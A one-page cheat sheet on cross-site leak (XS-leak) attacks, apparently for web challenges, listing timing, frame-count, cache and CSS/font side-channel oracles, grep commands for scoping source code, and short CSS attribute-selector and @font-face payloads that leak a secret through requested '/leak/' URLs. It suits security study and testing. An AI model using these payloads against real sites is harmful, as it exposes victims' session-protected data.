# XS-leak cheatsheet — the one-page reference

## The class in one line

A bot reads under the victim's session — the response is opaque but
a side-channel (frame-count, error, timing, cache, CSS-match,
server-state) leaks a bit or a character-set.

## The two sub-shapes

```
CLASSIC — the bot visits YOUR URL → your JS measures a side-channel
SEALED  — a fixed URL + script-blocked CSP → a server-state/CSS oracle
the question: can ANY origin the bot reaches run one line of my JS?
```

## The oracles

```
CLASSIC (client-side):
  frames.length    — one <iframe> per result
  onload/onerror   — a 200 vs a 404
  performance.now  — a slow vs fast response
  cache-probe      — a cached-vs-uncached timing
  :visited         — a history read
  window.open      — did the navigation happen

SEALED (declarative/server-state):
  CSS selector     — an attribute-match → a font/URL load
  @font-face       — a unicode-range → a character-set
  LRU eviction     — the surviving keys are the leak
  counter++        — the next value is the leak
  one-shot token   — consumed-or-not is the bit
```

## The detection

```bash
# the bot + the CSP
grep -rnoiE 'bot|visit|report|script-src|URLBlocklist' <src> | head
# the mutation surface
grep -rnoiE 'cache|store|counter|lru|evict|nonce|GETDEL' <src> | head
# the CSS surface
grep -rnoiE 'style|css|font-face|unicode-range|data-' <src> | head
```

## The CSS oracle

```css
body[secret^="ab"]{--m:url('/leak/ab')}
#trig{background-image:var(--m,none)}
/* the requested URL IS the matched selector */
```

## The @font-face oracle

```css
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
#secret{font-family:x;display:block !important}
/* the requested font URLs ARE the character-set */
```

## The control pair — always

```css
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
/* YES hits, NO doesn't — the channel works */
```

## The feasibility arithmetic

```
- secret's TTL → the whole leak+decode must fit
- request rate → thousands of markers need tens-hundreds rps
- bits/visit → a token=1, a recency=thousands
- char-set → a sorted/limited alphabet reduces the search
```

## The reconstruction

```
a boolean oracle     → a binary-search extend
a char-set (sorted)  → sort the set — the direct answer
an n-gram set        → a beam search over overlaps
```

## The falsifier

```
a sealed shape with no CSS oracle and no server-state channel —
the oracle surface is dead → a different class
```

## The confusables

```
a fetch READS bytes → web-cors    a WRITE → web-csrf
a script-tag serve → JSONP/XSSI   a stored-resp → cache-poison
a broadcast → postMessage-hijack
```
